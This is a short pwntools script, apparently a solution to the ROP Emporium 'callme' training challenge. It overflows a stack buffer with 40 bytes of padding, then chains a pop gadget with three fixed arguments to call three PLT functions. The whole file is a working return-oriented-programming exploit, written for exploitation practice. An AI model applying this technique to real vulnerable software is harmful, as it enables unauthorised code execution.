#!/usr/bin/python3
from pwn import *

# definitions
## .plt entries
callme_one = p64(0x00400720)
callme_two = p64(0x00400740)
callme_three = p64(0x004006f0)

## args from instructions @ pwn.emporium
arg0 = p64(0xdeadbeefdeadbeef)
arg1 = p64(0xcafebabecafebabe)
arg2 = p64(0xd00df00dd00df00d)
args = arg0 + arg1 + arg2

## gadgets
### pops rdi, rsi, rdx
pop_all = p64(0x000000000040093c)
ret = p64(0x00000000004006be)

## junk
junk = (b"A"*40)

# payload (due to stack alignment issues(?) we need to add ret gadget)
payload = junk + ret
payload += pop_all + args + callme_one
payload += pop_all + args + callme_two
payload += pop_all + args + callme_three

# process and execution
context.binary = binary = ELF("./callme", checksec=False)
p = process()
p.recvuntil(">")
p.sendline(payload)
p.interactive()
